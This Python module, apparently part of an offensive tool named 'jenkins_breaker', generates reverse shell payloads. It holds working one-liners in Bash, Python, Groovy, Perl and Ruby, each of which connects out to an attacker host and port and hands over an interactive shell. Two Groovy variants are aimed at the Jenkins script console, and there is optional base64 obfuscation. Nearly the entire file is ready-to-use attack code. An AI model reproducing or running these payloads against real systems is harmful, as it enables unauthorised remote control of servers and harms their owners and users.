"""Reverse shell payload generation for various platforms and languages.

Supports Bash, Python, Groovy, and provides multiple techniques for
establishing reverse shell connections.
"""

import base64

from jenkins_breaker.payloads.generator import (
    EncodingType,
    PayloadType,
    create_generator,
)


class ReverseShellGenerator:
    """Generates reverse shell payloads for multiple platforms."""

    @staticmethod
    def generate_bash_nc(lhost: str, lport: int, encoding: EncodingType = EncodingType.NONE) -> str:
        """Generate Bash reverse shell using netcat.

        Args:
            lhost: Listener host (attacker IP)
            lport: Listener port
            encoding: Encoding type to apply

        Returns:
            Bash reverse shell payload
        """
        template = "bash -c 'bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1'"

        generator = create_generator(
            PayloadType.REVERSE_SHELL,
            target_os="linux",
            encoding=encoding,
            lhost=lhost,
            lport=lport
        )

        return generator.generate(template)

    @staticmethod
    def generate_bash_devtcp(lhost: str, lport: int, encoding: EncodingType = EncodingType.NONE) -> str:
        """Generate Bash reverse shell using /dev/tcp.

        Args:
            lhost: Listener host
            lport: Listener port
            encoding: Encoding type to apply

        Returns:
            Bash /dev/tcp reverse shell payload
        """
        template = "0<&196;exec 196<>/dev/tcp/{{lhost}}/{{lport}}; sh <&196 >&196 2>&196"

        generator = create_generator(
            PayloadType.REVERSE_SHELL,
            target_os="linux",
            encoding=encoding,
            lhost=lhost,
            lport=lport
        )

        return generator.generate(template)

    @staticmethod
    def generate_bash_interactive(lhost: str, lport: int, encoding: EncodingType = EncodingType.NONE) -> str:
        """Generate interactive Bash reverse shell.

        Args:
            lhost: Listener host
            lport: Listener port
            encoding: Encoding type to apply

        Returns:
            Interactive Bash reverse shell payload
        """
        template = """bash -c 'exec bash -i &>/dev/tcp/{{lhost}}/{{lport}} <&1'"""

        generator = create_generator(
            PayloadType.REVERSE_SHELL,
            target_os="linux",
            encoding=encoding,
            lhost=lhost,
            lport=lport
        )

        return generator.generate(template)

    @staticmethod
    def generate_python_socket(lhost: str, lport: int, encoding: EncodingType = EncodingType.NONE) -> str:
        """Generate Python reverse shell using socket.

        Args:
            lhost: Listener host
            lport: Listener port
            encoding: Encoding type to apply

        Returns:
            Python socket reverse shell payload
        """
        template = """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{{lhost}}",{{lport}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'"""

        generator = create_generator(
            PayloadType.REVERSE_SHELL,
            target_os="linux",
            encoding=encoding,
            lhost=lhost,
            lport=lport
        )

        return generator.generate(template)

    @staticmethod
    def generate_python_pty(lhost: str, lport: int, encoding: EncodingType = EncodingType.NONE) -> str:
        """Generate Python reverse shell with PTY for better interactivity.

        Args:
            lhost: Listener host
            lport: Listener port
            encoding: Encoding type to apply

        Returns:
            Python PTY reverse shell payload
        """
        payload = f"""python3 -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'"""

        if encoding == EncodingType.BASE64:
            payload = base64.b64encode(payload.encode()).decode()

        return payload

    @staticmethod
    def generate_groovy_socket(lhost: str, lport: int, encoding: EncodingType = EncodingType.NONE) -> str:
        """Generate Groovy reverse shell for Jenkins script console.

        Args:
            lhost: Listener host
            lport: Listener port
            encoding: Encoding type to apply

        Returns:
            Groovy reverse shell payload for Jenkins
        """
        template = """String host="{{lhost}}";int port={{lport}};String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();"""

        generator = create_generator(
            PayloadType.REVERSE_SHELL,
            target_os="linux",
            encoding=encoding,
            lhost=lhost,
            lport=lport
        )

        return generator.generate(template)

    @staticmethod
    def generate_groovy_runtime(lhost: str, lport: int, encoding: EncodingType = EncodingType.NONE) -> str:
        """Generate Groovy reverse shell using Runtime.exec().

        Args:
            lhost: Listener host
            lport: Listener port
            encoding: Encoding type to apply

        Returns:
            Groovy Runtime.exec() reverse shell payload
        """
        bash_cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        bash_b64 = base64.b64encode(bash_cmd.encode()).decode()

        template = f"""String cmd = "bash -c {{echo,{bash_b64}}}|{{base64,-d}}|{{bash,-i}}".replace("{{","").replace("}}","");cmd.execute()"""

        if encoding == EncodingType.BASE64:
            template = base64.b64encode(template.encode()).decode()

        return template

    @staticmethod
    def generate_perl(lhost: str, lport: int, encoding: EncodingType = EncodingType.NONE) -> str:
        """Generate Perl reverse shell.

        Args:
            lhost: Listener host
            lport: Listener port
            encoding: Encoding type to apply

        Returns:
            Perl reverse shell payload
        """
        template = """perl -e 'use Socket;$i="{{lhost}}";$p={{lport}};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'"""

        generator = create_generator(
            PayloadType.REVERSE_SHELL,
            target_os="linux",
            encoding=encoding,
            lhost=lhost,
            lport=lport
        )

        return generator.generate(template)

    @staticmethod
    def generate_ruby(lhost: str, lport: int, encoding: EncodingType = EncodingType.NONE) -> str:
        """Generate Ruby reverse shell.

        Args:
            lhost: Listener host
            lport: Listener port
            encoding: Encoding type to apply

        Returns:
            Ruby reverse shell payload
        """
        template = """ruby -rsocket -e'exit if fork;c=TCPSocket.new("{{lhost}}",{{lport}});loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'"""

        generator = create_generator(
            PayloadType.REVERSE_SHELL,
            target_os="linux",
            encoding=encoding,
            lhost=lhost,
            lport=lport
        )

        return generator.generate(template)

    @staticmethod
    def get_all_payloads(lhost: str, lport: int, encoding: EncodingType = EncodingType.NONE) -> dict[str, str]:
        """Generate all reverse shell payload types.

        Args:
            lhost: Listener host
            lport: Listener port
            encoding: Encoding type to apply

        Returns:
            Dictionary mapping payload names to payload strings
        """
        return {
            "bash_nc": ReverseShellGenerator.generate_bash_nc(lhost, lport, encoding),
            "bash_devtcp": ReverseShellGenerator.generate_bash_devtcp(lhost, lport, encoding),
            "bash_interactive": ReverseShellGenerator.generate_bash_interactive(lhost, lport, encoding),
            "python_socket": ReverseShellGenerator.generate_python_socket(lhost, lport, encoding),
            "python_pty": ReverseShellGenerator.generate_python_pty(lhost, lport, encoding),
            "groovy_socket": ReverseShellGenerator.generate_groovy_socket(lhost, lport, encoding),
            "groovy_runtime": ReverseShellGenerator.generate_groovy_runtime(lhost, lport, encoding),
            "perl": ReverseShellGenerator.generate_perl(lhost, lport, encoding),
            "ruby": ReverseShellGenerator.generate_ruby(lhost, lport, encoding),
        }


def generate_reverse_shell(
    shell_type: str,
    lhost: str,
    lport: int,
    encoding: EncodingType = EncodingType.NONE
) -> str:
    """Factory function to generate reverse shell by type.

    Args:
        shell_type: Type of shell (bash_nc, python_socket, groovy_socket, etc.)
        lhost: Listener host
        lport: Listener port
        encoding: Encoding type to apply

    Returns:
        Generated reverse shell payload

    Raises:
        ValueError: If shell_type is not supported
    """
    generators = {
        "bash_nc": ReverseShellGenerator.generate_bash_nc,
        "bash_devtcp": ReverseShellGenerator.generate_bash_devtcp,
        "bash_interactive": ReverseShellGenerator.generate_bash_interactive,
        "python_socket": ReverseShellGenerator.generate_python_socket,
        "python_pty": ReverseShellGenerator.generate_python_pty,
        "groovy_socket": ReverseShellGenerator.generate_groovy_socket,
        "groovy_runtime": ReverseShellGenerator.generate_groovy_runtime,
        "perl": ReverseShellGenerator.generate_perl,
        "ruby": ReverseShellGenerator.generate_ruby,
    }

    if shell_type not in generators:
        raise ValueError(f"Unsupported shell type: {shell_type}. Supported: {list(generators.keys())}")

    return generators[shell_type](lhost, lport, encoding)
